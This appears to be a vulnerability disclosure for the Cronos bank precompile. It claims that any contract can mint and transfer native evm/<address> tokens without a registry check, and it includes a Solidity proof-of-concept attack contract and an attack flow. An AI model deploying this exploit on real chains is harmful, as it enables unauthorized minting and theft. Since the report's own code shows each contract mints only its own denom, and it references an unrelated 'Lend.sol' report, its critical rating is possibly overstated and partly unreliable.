### Title
Bank Precompile `mint` Allows Any Arbitrary Contract to Mint Unbacked Native `evm/<address>` Tokens Without Authorization - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `mint` (and `transfer`) methods derive the native token denom from `contract.Caller()` but perform **no check** that the calling contract is a registered or authorized token contract. Any unprivileged EVM contract can call `bank.mint(recipient, amount)` and mint an unlimited supply of native `evm/<caller_address>` Cosmos tokens without burning any backing CRC20 tokens, creating unbacked precompile-controlled assets.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles the `mint` method as follows:

```go
denom := EVMDenom(contract.Caller())          // line 130: "evm/" + callerAddress.Hex()
amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
    if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
        return err
    }
    if method.Name == "mint" {
        if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil { // line 137
```

The only guards present are:
- `amount.Sign() <= 0` (line 123) — rejects zero/negative amounts
- `checkBlockedAddr` (line 127) — rejects module accounts as recipients
- `IsSendEnabledCoins` (line 133) — checks send-enable flag

There is **no check** that `contract.Caller()` is a registered contract in the Cronos token mapping (i.e., no lookup against `GetContractByDenom` / `GetDenomByContract`). The design intent, illustrated in `integration_tests/contracts/contracts/TestBank.sol`, is that a CRC20 contract burns its ERC20 tokens before calling `bank.mint` to issue the equivalent native representation — maintaining a 1:1 backing invariant. This invariant is never enforced by the precompile.

The same missing check applies to the `transfer` method (line 186), where `sender := args[0].(common.Address)` is taken directly from calldata with no verification that `contract.Caller()` is authorized to move funds on behalf of that address — allowing any contract to drain `evm/<caller_address>` tokens from any holder without consent.

---

### Impact Explanation

**Critical — Unauthorized mint of precompile-controlled assets.**

Any unprivileged actor can deploy an EVM contract and call the bank precompile's `mint` method to create an arbitrary quantity of native `evm/<attacker_contract>` Cosmos tokens with zero backing. These are real entries in the Cosmos `x/bank` module state. They can be:

- Transferred to any Cosmos address via standard `MsgSend`
- Sent over IBC to any connected chain that accepts arbitrary denoms
- Used in any Cosmos module (DEX, staking derivatives, etc.) that accepts arbitrary native denoms

Additionally, the `transfer` auth bypass allows the same contract to move `evm/<caller_address>` tokens from any holder's account to any destination without the holder's approval, enabling theft of native assets that users legitimately acquired through the `moveToNative` conversion flow.

---

### Likelihood Explanation

**High.** The bank precompile is deployed at the fixed address `0x0000000000000000000000000000000000000064` and is callable by any EVM contract with no access restriction. Deploying a contract and calling `bank.mint` requires only a standard EVM transaction — no privileged keys, governance, or validator access needed. The attack is fully self-contained and deterministic.

---

### Recommendation

Before executing `mint`, `burn`, or `transfer`, verify that `contract.Caller()` is a registered contract in the Cronos token mapping:

```go
// In Run(), before the mint/transfer logic:
callerAddr := contract.Caller()
if _, found := bc.cronosKeeper.GetDenomByContract(ctx, callerAddr); !found {
    return nil, errors.New("caller is not a registered token contract")
}
```

For `transfer`, additionally enforce that the caller is authorized to act on behalf of `sender` (e.g., require `sender == contract.Caller()` or implement an allowance mechanism):

```go
if sender != contract.Caller() {
    return nil, errors.New("caller not authorized to transfer on behalf of sender")
}
```

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract AttackerBank {
    address constant BANK_PRECOMPILE = 0x0000000000000000000000000000000000000064;
    IBankModule bank = IBankModule(BANK_PRECOMPILE);

    // Step 1: mint unlimited evm/<address(this)> native tokens to attacker
    function mintUnbacked(address attacker, uint256 amount) external {
        // No CRC20 tokens are burned — pure unbacked mint
        bank.mint(attacker, amount);
        // attacker now holds `amount` of native "evm/0xAttackerBank" tokens
    }

    // Step 2: steal evm/<address(this)> tokens from any victim who holds them
    function stealFromVictim(address victim, address attacker, uint256 amount) external {
        // No approval from victim required
        bank.transfer(victim, attacker, amount);
    }
}
```

**Attack flow:**

1. Attacker deploys `AttackerBank` at `0xATK`.
2. Attacker calls `AttackerBank.mintUnbacked(attacker, 1_000_000e18)`.
3. The bank precompile mints `1_000_000e18` of native denom `evm/0xATK` to the attacker — no backing, no authorization check.
4. Attacker sends these tokens via IBC or uses them in any Cosmos module accepting arbitrary denoms.
5. If any user previously called `moveToNative` on `AttackerBank` and holds `evm/0xATK` tokens, attacker calls `stealFromVictim(victim, attacker, balance)` to drain them without the victim's consent.

The root cause is the absence of any registry check at lines 130–137 of `x/cronos/keeper/precompiles/bank.go` — directly analogous to the missing `require(controller.accreditedAddresses(_pool))` in the external report's `Lend.sol`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L130-141)
```go
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-193)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L14-17)
```text
    function moveToNative(uint256 amount) public returns (bool) {
        _burn(msg.sender, amount);
        return bank.mint(msg.sender, amount);
    }
```
